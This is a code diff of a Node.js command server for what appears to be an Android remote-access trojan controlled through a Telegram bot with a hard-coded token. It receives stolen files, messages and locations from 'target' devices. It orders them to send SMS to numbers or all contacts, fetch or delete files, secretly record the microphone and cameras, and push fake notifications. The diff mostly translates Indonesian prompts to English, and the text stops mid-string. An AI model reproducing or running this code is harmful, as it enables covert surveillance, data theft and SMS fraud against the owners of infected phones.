@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = '7536436084:AAGpx7eJQsCwfggjwGUxWazyj-KXQWWXfvo'
 const id = '7953841468'
-const address = 'https://telebot-production-45ec.up.railway.app/'
+const address = 'https://www.google.com'
 
 const app = express();
 const appServer = http.createServer(app);
@@ -25,13 +25,13 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center"> 𝙎𝙚𝙧𝙫𝙚𝙧 𝙗𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙙𝙞𝙟𝙖𝙡𝙖𝙣𝙠𝙖𝙣</h1>')
+    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname
     appBot.sendDocument(id, req.file.buffer, {
-            caption: `°• 𝙋𝙚𝙨𝙖𝙣 𝙙𝙖𝙧𝙞 <b>${req.headers.model}</b> 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩`,
+            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
             parse_mode: "HTML"
         },
         {
@@ -41,12 +41,12 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     res.send('')
 })
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• 𝙋𝙚𝙨𝙖𝙣 𝙙𝙖𝙧𝙞 <b>${req.headers.model}</b> 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩\n\n` + req.body['text'], {parse_mode: "HTML"})
+    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
     res.send('')
 })
 app.post("/uploadLocation", (req, res) => {
     appBot.sendLocation(id, req.body['lat'], req.body['lon'])
-    appBot.sendMessage(id, `°• 𝙇𝙤𝙠𝙖𝙨𝙞 𝙙𝙖𝙧𝙞 <b>${req.headers.model}</b> 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩`, {parse_mode: "HTML"})
+    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
     res.send('')
 })
 appSocket.on('connection', (ws, req) => {
@@ -66,41 +66,39 @@ appSocket.on('connection', (ws, req) => {
         provider: provider
     })
     appBot.sendMessage(id,
-       `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙗𝙖𝙧𝙪 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜\n\n` +
-       `• ᴍᴏᴅᴇʟ ᴘᴇʀᴀɴɢᴋᴀᴛ : <b>${model}</b>\n` +
-      `• ᴛɪɴɢᴋᴀᴛ ʙᴀᴛᴇʀᴀɪ : <b>${battery}</b>\n` +
-     `• ᴠᴇʀꜱɪ ᴀɴᴅʀᴏɪᴅ : <b>${version}</b>\n` +
-        `• ᴋᴇᴛᴇʀᴀɴɢᴀɴ ʟᴀʏᴀʀ : <b>${brightness}</b>\n` +
-      `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
-      {parse_mode: "HTML"}
+        `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
+        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
+        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
+        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
+        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
+        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
+        {parse_mode: "HTML"}
     )
     ws.on('close', function () {
-       appBot.sendMessage(id,
-          `°• 𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙥𝙪𝙩𝙪𝙨 𝙙𝙖𝙧𝙞 𝙨𝙚𝙧𝙫𝙚𝙧\n\n` +
-           `• ᴍᴏᴅᴇʟ ᴘᴇʀᴀɴɢᴋᴀᴛ : <b>${model}</b>\n` +
-           `• ᴛɪɴɢᴋᴀᴛ ʙᴀᴛᴇʀᴀɪ : <b>${battery}</b>\n` +
-          `• ᴠᴇʀꜱɪ ᴀɴᴅʀᴏɪᴅ : <b>${version}</b>\n` +
-           `• ᴋᴇᴛᴇʀᴀɴɢᴀɴ ʟᴀʏᴀʀ : <b>${brightness}</b>\n` +
-           `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
-           {parse_mode: "HTML"}
-       )
-       appClients.delete(ws.uuid)
+        appBot.sendMessage(id,
+            `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
+            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
+            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
+            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
+            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
+            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
+            {parse_mode: "HTML"}
+        )
+        appClients.delete(ws.uuid)
     })
 })
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
     if (message.reply_to_message) {
-        // Jika membalas permintaan nomor tujuan SMS
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙣𝙤𝙢𝙤𝙧 𝙩𝙪𝙟𝙪𝙖𝙣')) {
+        if (message.reply_to_message.text.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
             currentNumber = message.text
             appBot.sendMessage(id,
-                '°• 𝘽𝙖𝙞𝙠, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙞𝙣𝙜𝙞𝙣 𝙙𝙞𝙠𝙞𝙧𝙞𝙢 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 𝙞𝙣𝙞\n\n' +
-                '• ʜᴀʀᴀᴘ ʙᴇʜᴀᴛɪ-ʜᴀᴛɪ, ᴘᴇꜱᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴊɪᴋᴀ ᴊᴜᴍʟᴀʜ ᴋᴀʀᴀᴋᴛᴇʀ ᴍᴇʟᴇʙɪʜɪ ʙᴀᴛᴀꜱ',
-                { "reply_markup": { force_reply: true } }
+                '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
+                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
+                {reply_markup: {force_reply: true}}
             )
         }
-        // Jika membalas pesan permintaan isi pesan SMS
-        if (message.reply_to_message.text.includes('°• 𝘽𝙖𝙞𝙠, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣')) {
+        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
                     ws.send(`send_message:${currentNumber}/${message.text}`)
@@ -109,41 +107,38 @@ appBot.on('message', (message) => {
             currentNumber = ''
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        // Jika membalas permintaan kirim ke semua kontak
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙠𝙞𝙧𝙞𝙢 𝙠𝙚 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠')) {
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
             const message_to_all = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
                     ws.send(`send_message_to_all:${message_to_all}`)
                 }
             });
-            currentNumber = ''
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        // Jika membalas permintaan path file untuk download
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙡𝙤𝙠𝙖𝙨𝙞 𝙛𝙞𝙡𝙚 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙪𝙣𝙙𝙪𝙝')) {
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
             const path = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -152,38 +147,41 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙡𝙤𝙠𝙖𝙨𝙞 𝙛𝙞𝙡𝙚 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙝𝙖𝙥𝙪𝙨')) {
-          const path = message.text
-           appSocket.clients.forEach(function each(ws) {
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
+            const path = message.text
+            appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
                     ws.send(`delete_file:${path}`)
                 }
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙗𝙚𝙧𝙖𝙥𝙖 𝙡𝙖𝙢𝙖 𝙢𝙞𝙠𝙧𝙤𝙛𝙤𝙣 𝙖𝙠𝙖𝙣 𝙙𝙞𝙧𝙚𝙠𝙖𝙢')) {
+        
+        ///sini///
+        
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
             const duration = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -192,18 +190,18 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙗𝙚𝙧𝙖𝙥𝙖 𝙡𝙖𝙢𝙖 𝙠𝙖𝙢𝙚𝙧𝙖 𝙪𝙩𝙖𝙢𝙖 𝙖𝙠𝙖𝙣 𝙙𝙞𝙧𝙚𝙠𝙖𝙢')) {
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
             const duration = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -212,18 +210,18 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙗𝙚𝙧𝙖𝙥𝙖 𝙡𝙖𝙢𝙖 𝙠𝙖𝙢𝙚𝙧𝙖 𝙨𝙚𝙡𝙛𝙞𝙚 𝙖𝙠𝙖𝙣 𝙙𝙞𝙧𝙚𝙠𝙖𝙢')) {
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
             const duration = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -232,18 +230,18 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙩𝙖𝙢𝙥𝙞𝙡𝙠𝙖𝙣 𝙙𝙞 𝙡𝙖𝙮𝙖𝙧 𝙥𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙖𝙧𝙜𝙚𝙩')) {
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
             const toastMessage = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -252,27 +250,29 @@ appBot.on('message', (message) => {
             });
             currentUuid = ''
             appBot.sendMessage(id,
-                '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
-                '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
+                '°• Permintaan Anda sedang diproses\n\n' +
+                '• Anda akan menerima respons dalam beberapa saat',
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙢𝙪𝙣𝙘𝙪𝙡 𝙨𝙚𝙗𝙖𝙜𝙖𝙞 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞')) {
+        ///sini
+        
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
             const notificationMessage = message.text
             currentTitle = notificationMessage
             appBot.sendMessage(id,
-                '°• 𝘽𝙖𝙞𝙠, 𝙨𝙚𝙠𝙖𝙧𝙖𝙣𝙜 𝙢𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙩𝙖𝙪𝙩𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙗𝙪𝙠𝙖 𝙠𝙚𝙩𝙞𝙠𝙖 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞 𝙙𝙞𝙠𝙡𝙞𝙠\n\n' +
-                '• ꜱᴀᴀᴛ ᴛᴀʀɢᴇᴛ ᴍᴇɴɢᴋʟɪᴋ ɴᴏᴛɪꜰɪᴋᴀꜱɪ, ᴛᴀᴜᴛᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴅɪʙᴜᴋᴀ',
